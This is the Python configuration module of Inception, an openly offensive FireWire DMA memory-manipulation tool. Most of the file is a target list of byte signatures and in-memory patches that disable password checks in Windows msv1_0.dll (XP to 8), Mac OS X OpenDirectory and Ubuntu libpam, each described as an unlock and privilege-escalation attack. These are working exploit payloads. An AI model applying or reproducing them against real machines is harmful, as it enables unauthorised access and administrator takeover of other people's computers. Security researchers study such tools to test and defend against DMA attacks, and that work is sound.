'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2012  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Sep 6, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
'''
#===============================================================================
# General information
#===============================================================================
version = '0.2.0'
url = 'http://breaknenter.org/projects/inception'

#===============================================================================
# Constants
#===============================================================================
KiB = 1024                          # One KibiByte
MiB = 1024 * KiB                    # One MebiByte
GiB = 1024 * MiB                    # One GibiByte
PAGESIZE = 4 * KiB                  # For the sake of this tool, always the case
OUICONF = 'data/oui.txt'            # FireWire OUI database relative to package
LINUX = 'Linux'
OSX = 'Darwin'
WINDOWS = 'Windows'
    
#===============================================================================
# Global variables/default settings
#===============================================================================
verbose = False                 # Not verbose
fw_delay = 15                   # 15 seconds delay before attacking
filemode = False                # Search in file instead of FW DMA
dry_run = False                 # No write-back into memory
target = False                  # No target set
filename = ''                   # No filename set per default
buflen = 15                     # Buffer length for checking if we get data
memsize = 4 * GiB               # 4 GiB, theoretical FW max
success = True                  # Optimistic-by-nature setting
encoding = None                 # System encoding
vectorsize = 128                # Read vector size
memdump = False                 # Memory dump mode off
startaddress = MiB              # Default memory start address
dumpsize = False                # Not set by default
interactive = False             # Interactive mode off
max_request_size = PAGESIZE//2  # By default the max request size is the PSZ/2
override = False                # By default, avoid access Upper Memory
avoid = [0xa0000, 0xfffff]      # Upper Win memory area (can cause BSOD if accessed)
apple_avoid = [0x0, 0xff000]    # Avoid this area if dumping memory from Macs
apple_target = False            # Set to true if we are attacking a Mac
pickpocket = False              # Pickpocket mode off by default
polldelay = 5                   # 5 seconds delay between FireWire polls
os = None                       # Detected host OS is None by default
forcewrite = False              # Do not write back to file in file mode
list_signatures = False         # Don't list all signatures at startup

#===============================================================================
# Targets are collected in a list of dicts using the following syntax:
# [{'OS': 'OS 1 name' # Used for matching and OS guessing
#  'versions': ['SP0', 'SP2'],
#  'architecture': 'x86',
#  'name': 'Target 1 name',
#  'notes': 'Target 1 notes',
#  'signatures': [
#                 # 1st signature. Signatures are in an ordered list, and are
#                 # searched for in the sequence listed. If not 'keepsearching'
#                 # key is set, the tool will stop at the first match & patch.
#                 {'offsets': 0x00, # Relative to page boundary
#                  'chunks': [{'chunk': 0x00, # Signature to search for
#                              'internaloffset': 0x00, # Relative to offset
#                              'patch': 0xff, # Patch data
#                              'patchoffset': 0x00}]}, # Patch at an offset
#                 # 2nd signature. Demonstrates use of several offsets that
#                 # makes it easier to match signatures where the offset change
#                 # often. Also demonstrates split signatures; where the tool
#                 # matches that are split over several blobs of data. The
#                 # resulting patch below is '0x04__05' where no matching is
#                 # done for the data represented by '__'.
#                 {'offsets': [0x01, 0x02], # Signatures can have several offs
#                  'chunks': [{'chunk': 0x04, # 1st part of signature
#                              'internaloffset': 0x00,
#                              'patch': 0xff, # Patch data for the 1st part
#                              'patchoffset': 0x03}, # Patch at an offset
#                             {'chunk': 0x05, # 2nd part of signature
#                              'internaloffset': 0x02, # Offset relative to sig
#                              'patch': 0xff}]}]}] # Patch data for the 2nd part
#
# Key 'patchoffset' is optional and will be treated like 'None' if not 
# provided.
#
# OS key should follow the rudimentary format 'Name Version'
#
# Example signature with graphical explanation:
#
# 'signatures': [{'offsets': 0x01,
#                          'chunks': [{'chunk': 0xc60f85,
#                                      'internaloffset': 0x00},
#                                     {'chunk': 0x0000b8,
#                                      'internaloffset': 0x05,
#                                      'patch': 0xb001,
#                                      'patchoffset': 0x0a}]}]},
# 
# EQUALS:
#
#   |-- Offset 0x00                     
#  /                                           
# /\             |-patchoffset--------------->[b0 01]   
# 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f .. (byte offset)
# -----------------------------------------------
# c6 0f 85 a0 b8 00 00 b8 ab 05 03 ff ef 01 00 00 .. (chunk of memory data)
# -----------------------------------------------
# \______/ \___/ \______/
#     \      \       \
#      \      \       |-- Chunk 2 at internaloffset 0x05
#       \      |-- Some data (ignore, don't match this)
#        |-- Chunk 1 at internaloffset 0x00
# \_____________________/
#            \
#             |-- Entire signature
#
#===============================================================================

targets=[{'OS': 'Windows 8',
          'versions': ['SP0'],
          'architectures': ['x86', 'x64'],
          'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
          'notes': 'Ensures that the password-check always returns true. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
          'signatures': [{'offsets': [0xde7], # x86 SP0 
                          'chunks': [{'chunk': 0x8bff558bec81ec90000000a1,
                                      'internaloffset': 0x00,
                                      'patch': 0xb001, # mov al,1
                                      'patchoffset': 0xc1}]},
                         {'offsets': [0x208], # x64 SP0
                          'chunks': [{'chunk': 0xc60f85,
                                      'internaloffset': 0x00,
                                      'patch': 0x909090909090,
                                      'patchoffset': 0x01},
                                     {'chunk': 0x66b80100,
                                      'internaloffset': 0x07}]}]},
         {'OS': 'Windows 7',
          'versions': ['SP0', 'SP1'],
          'architectures': ['x32', 'x64'],
          'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
          'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291, 0x321], # x64 SP0-SP1
                          'chunks': [{'chunk': 0xc60f85,
                                      'internaloffset': 0x00,
                                      'patch': 0x909090909090,
                                      'patchoffset': 0x01},
                                     {'chunk': 0xb8,
                                      'internaloffset': 0x07}]},
                         {'offsets': [0x926], # x86 SP0
                          'chunks': [{'chunk': 0x83f8107513b0018b,
                                      'internaloffset': 0x00,
                                      'patch': 0x83f8109090b0018b,
                                      'patchoffset': 0x00}]},
                         {'offsets': [0x312], # x86 SP1
                          'chunks': [{'chunk': 0x83f8100f8550940000b0018b,
                                      'internaloffset': 0x00,
                                      'patch': 0x83f810909090909090b0018b,
                                      'patchoffset': 0x00}]}]},
         {'OS': 'Windows Vista',
          'versions': ['SP0', 'SP2'],
          'architectures': ['x86', 'x64'],
          'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
          'signatures': [{'offsets': [0x1a1], # x64 SP2
                          'chunks': [{'chunk': 0xc60f85,
                                      'internaloffset': 0x00,
                                      'patch': 0x909090909090,
                                      'patchoffset': 0x01},
                                     {'chunk': 0xb8,
                                      'internaloffset': 0x07}]},
                         {'offsets': [0x432, 0x80f, 0x74a], # SP0, SP1, SP2 x86
                          'chunks': [{'chunk': 0x83f8107513b0018b,
                                      'internaloffset': 0x00,
                                      'patch': 0x83f8109090b0018b,
                                      'patchoffset': 0x00}]}]},
         {'OS': 'Windows XP',
          'versions': ['SP2', 'SP3'],
          'architectures': ['x86'],
          'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
          'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6], # SP2-3 x86
                          'chunks': [{'chunk': 0x83f8107511b0018b,
                                      'internaloffset': 0x00,
                                      'patch': 0x83f8109090b0018b,
                                      'patchoffset': 0x00}]}]},
         {'OS': 'Mac OS X',
          'versions': ['10.6.4', '10.6.8', '10.7.3', '10.8.2'],
          'architectures': ['x32', 'x64'],
          'name': 'DirectoryService/OpenDirectory unlock/privilege escalation',
          'notes': 'Overwrites DoShadowHashAuth/ODRecordVerifyPassword return value. After running, all local authentications (e.g., GUI, sudo, etc.) will work with all non-blank passwords',
          'signatures': [{'offsets': [0x7cf], # 10.6.4 x64
                          'chunks': [{'chunk': 0x41bff6c8ffff48c78588,
                                      'internaloffset': 0x00,
                                      'patch': 0x41bf0000000048c78588,
                                      'patchoffset': 0x00}]},
                         {'offsets': [0xbff], # 10.6.8 x64
                          'chunks': [{'chunk': 0x41bff6c8ffff,
                                      'internaloffset': 0x00,
                                      'patch': 0x41bf00000000,
                                      'patchoffset': 0x00}]},
                         {'offsets': [0x82f], # 10.6.8 x32
                          'chunks': [{'chunk': 0xc78580f6fffff6c8ffff,
                                      'internaloffset': 0x00,
                                      'patch': 0xc78580f6ffff00000000,
                                      'patchoffset': 0x00}]},
                         {'offsets': [0xfa7], # 10.7.3 x64
                          'chunks': [{'chunk': 0x0fb6,
                                      'internaloffset': 0x00,
                                      'patch': 0x31dbffc3, # xor ebx, ebx; inc ebx;
                                      'patchoffset': 0x00},
                                     {'chunk': 0x89d8eb0231c04883c4785b415c415d415e415f5dc3,
                                      'internaloffset': 0x0e}]},
                         {'offsets': [0x334], # 10.8.2 x64
                          'chunks': [{'chunk': 0x88d84883c4685b415c415d415e415f5d,
                                      'internaloffset': 0x00,
                                      'patch': 0xb001, # mov al,1;
                                      'patchoffset': 0x00}]}]},
         {'OS': 'Ubuntu',
          'versions': ['11.04','11.10','12.04'],
          'architectures': ['x32', 'x64'],
          'name': 'libpam unlock/privilege escalation',
          'notes': 'Overwrites pam_authenticate return value. After running, all PAM-based authentications (e.g., GUI, tty and sudo) will work with no password.',
          'signatures': [{'offsets': [0xebd, 0xbaf, 0xa7f], # 11.10, 11.04, 12.04 x86
                          'chunks': [{'chunk': 0x83f81f89c774,
                                      'internaloffset': 0x00,
                                      'patch': 0xbf00000000eb,
                                      'patchoffset': 0x00}]},
                         {'offsets': [0x838, 0x5b8, 0x3c8], # 11.10, 11.04, 12.04 x64
                          'chunks': [{'chunk': 0x83f81f89c574,
                                      'internaloffset': 0x00,
                                      'patch': 0xbd00000000eb,
                                      'patchoffset': 0x00}]}]}]

egg = False